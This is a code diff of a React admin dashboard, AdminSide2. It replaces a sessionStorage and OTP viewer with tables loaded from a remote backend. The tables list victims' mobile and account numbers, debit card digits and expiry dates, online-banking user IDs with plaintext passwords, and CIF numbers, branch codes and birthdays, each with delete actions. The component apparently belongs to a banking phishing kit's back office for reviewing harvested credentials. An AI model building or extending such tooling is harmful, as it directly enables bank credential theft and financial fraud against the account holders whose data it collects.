@@ -1,88 +1,157 @@
-// src/components/AdminSide2.js
 import React, { useEffect, useState } from 'react';
 
 const AdminSide2 = () => {
-    const [submittedData, setSubmittedData] = useState([]);
-    const [selectedUser, setSelectedUser] = useState(null); // State for selected user
-    const [otp, setOtp] = useState(''); // State for OTP
+  const [users, setUsers] = useState([]);
+  const [bankDetails, setBankDetails] = useState([]);
+  const [bankingLast, setBankingLast] = useState([]);
 
-    useEffect(() => {
-        const data = JSON.parse(sessionStorage.getItem('submittedData')) || [];
-        console.log("Retrieved Data:", data); // Debugging line
-        setSubmittedData(data);
-
-        // Retrieve the OTP from session storage
-        const storedOtp = sessionStorage.getItem('otp');
-        setOtp(storedOtp || ''); // Set the OTP state, defaulting to an empty string
-    }, []);
-
-    const handleDelete = (index) => {
-        const updatedData = submittedData.filter((_, i) => i !== index);
-        setSubmittedData(updatedData);
-        sessionStorage.setItem('submittedData', JSON.stringify(updatedData)); // Update sessionStorage
-        if (selectedUser && index === selectedUser.index) {
-            setSelectedUser(null); // Deselect if the deleted user was selected
-        }
+  useEffect(() => {
+    const fetchUsers = async () => {
+      const response = await fetch('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/api');
+      const data = await response.json();
+      setUsers(data);
     };
 
-    const handleSelectUser = (index) => {
-        setSelectedUser({ index, data: submittedData[index] }); // Set selected user data
+    const fetchBankDetails = async () => {
+      const response = await fetch('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/detelis');
+      const data = await response.json();
+      setBankDetails(data);
     };
 
-    return (
-        <div className="flex p-8 space-x-8">
-            <div className="w-1/3">
-                <h1 className="text-2xl font-bold mb-4">User List</h1>
-                {submittedData.length > 0 ? (
-                    <ul className="space-y-2">
-                        {submittedData.map((_, index) => ( // Only use index for display
-                            <li
-                                key={index}
-                                onClick={() => handleSelectUser(index)}
-                                className="cursor-pointer bg-blue-100 p-2 rounded-md hover:bg-blue-200"
-                            >
-                                User {index + 1} {/* Display user as a simple number */}
-                            </li>
-                        ))}
-                    </ul>
-                ) : (
-                    <p className="text-gray-500">No data submitted yet.</p>
-                )}
-            </div>
-            <div className="w-2/3">
-                {selectedUser ? (
-                    <div className="p-4 rounded-lg border bg-white shadow-md">
-                        <h2 className="text-xl font-bold mb-2">User Details</h2>
-                        {Object.keys(selectedUser.data).map((key) => (
-                            <p key={key} className="text-gray-800">
-                                <span className="font-semibold">{key}:</span> {selectedUser.data[key]}
-                            </p>
-                        ))}
-                        <button
-                            onClick={() => handleDelete(selectedUser.index)}
-                            className="bg-red-600 text-white px-4 py-2 rounded-md mt-4"
-                        >
-                            Delete Entry
-                        </button>
-                    </div>
-                ) : (
-                    <p className="text-gray-500">Select a user to view details.</p>
-                )}
+    const fetchBankingLast = async () => {
+      const response = await fetch('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/bankinglast/get');
+      const data = await response.json();
+      setBankingLast(data);
+    };
 
-                {/* Display the OTP */}
-                <div className="mt-4 p-4 rounded-lg border bg-white shadow-md">
-                    <h2 className="text-xl font-bold mb-2">Entered OTP</h2>
-                    {otp ? (
-                        <p className="text-gray-800">
-                            <span className="font-semibold">OTP:</span> {otp}
-                        </p>
-                    ) : (
-                        <p className="text-gray-500">No OTP entered yet.</p>
-                    )}
-                </div>
-            </div>
-        </div>
-    );
+    fetchUsers();
+    fetchBankDetails();
+    fetchBankingLast();
+  }, []);
+
+  const deleteUser = async (id) => {
+    await fetch(`https://back-end-card-git-main-alvin-sifats-projects.vercel.app/api/${id}`, {
+      method: 'DELETE',
+    });
+    setUsers(users.filter(user => user._id !== id));
+  };
+
+  const deleteBankDetail = async (id) => {
+    await fetch(`https://back-end-card-git-main-alvin-sifats-projects.vercel.app/detelis/${id}`, {
+      method: 'DELETE',
+    });
+    setBankDetails(bankDetails.filter(bankDetail => bankDetail._id !== id)); // Use _id for filtering
+  };
+
+  const deleteBankingLast = async (id) => {
+    await fetch(`https://back-end-card-git-main-alvin-sifats-projects.vercel.app/bankinglast/${id}`, {
+      method: 'DELETE',
+    });
+    setBankingLast(bankingLast.filter(lastDetail => lastDetail._id !== id));
+  };
+
+  return (
+    <div className="container mx-auto p-4">
+      <h1 className="text-2xl font-bold mb-4">Admin Dashboard</h1>
+
+      <section className="mb-8">
+        <h2 className="text-xl font-semibold mb-2">Users</h2>
+        <table className="min-w-full bg-white shadow-md rounded-lg overflow-hidden">
+          <thead>
+            <tr className="bg-gray-200">
+              <th className="py-2 px-4">Mobile Number</th>
+              <th className="py-2 px-4">Account Number</th>
+              <th className="py-2 px-4">Debit Card Digits</th>
+              <th className="py-2 px-4">Expiry Date</th>
+              <th className="py-2 px-4">Actions</th>
+            </tr>
+          </thead>
+          <tbody>
+            {users.map((user) => (
+              <tr key={user._id}>
+                <td className="py-2 px-4">{user.mobileNumber}</td>
+                <td className="py-2 px-4">{user.accountNumber}</td>
+                <td className="py-2 px-4">{user.debitCardDigits}</td>
+                <td className="py-2 px-4">{user.expiryDate}</td>
+                <td className="py-2 px-4">
+                  <button 
+                    onClick={() => deleteUser(user._id)} 
+                    className="text-red-600 hover:text-red-800"
+                  >
+                    Delete
+                  </button>
+                </td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </section>
+
+      <section className="mb-8">
+        <h2 className="text-xl font-semibold mb-2">Bank Details</h2>
+        <table className="min-w-full bg-white shadow-md rounded-lg overflow-hidden">
+          <thead>
+            <tr className="bg-gray-200">
+              <th className="py-2 px-4">Bank Name</th>
+              <th className="py-2 px-4">User ID</th>
+              <th className="py-2 px-4">Password</th>
+              <th className="py-2 px-4">Actions</th>
+            </tr>
+          </thead>
+          <tbody>
+            {bankDetails.map((bankDetail) => (
+              <tr key={bankDetail._id}>
+                <td className="py-2 px-4">{bankDetail.bankName}</td>
+                <td className="py-2 px-4">{bankDetail.userID}</td>
+                <td className="py-2 px-4">{bankDetail.password}</td>
+                <td className="py-2 px-4">
+                  <button 
+                    onClick={() => deleteBankDetail(bankDetail._id)} 
+                    className="text-red-600 hover:text-red-800"
+                  >
+                    Delete
+                  </button>
+                </td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </section>
+
+      <section className="mb-8">
+        <h2 className="text-xl font-semibold mb-2">Banking Last Details</h2>
+        <table className="min-w-full bg-white shadow-md rounded-lg overflow-hidden">
+          <thead>
+            <tr className="bg-gray-200">
+              <th className="py-2 px-4">Account Number</th>
+              <th className="py-2 px-4">CIF Number</th>
+              <th className="py-2 px-4">Branch Code</th>
+              <th className="py-2 px-4">Birthday</th>
+              <th className="py-2 px-4">Actions</th>
+            </tr>
+          </thead>
+          <tbody>
+            {bankingLast.map((lastDetail) => (
+              <tr key={lastDetail._id}>
+                <td className="py-2 px-4">{lastDetail.accountNumber}</td>
+                <td className="py-2 px-4">{lastDetail.cifNumber}</td>
+                <td className="py-2 px-4">{lastDetail.branchCode}</td>
+                <td className="py-2 px-4">{new Date(lastDetail.birthday).toLocaleDateString()}</td>
+                <td className="py-2 px-4">
+                  <button 
+                    onClick={() => deleteBankingLast(lastDetail._id)} 
+                    className="text-red-600 hover:text-red-800"
+                  >
+                    Delete
+                  </button>
+                </td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </section>
+    </div>
+  );
 };
 
 export default AdminSide2;
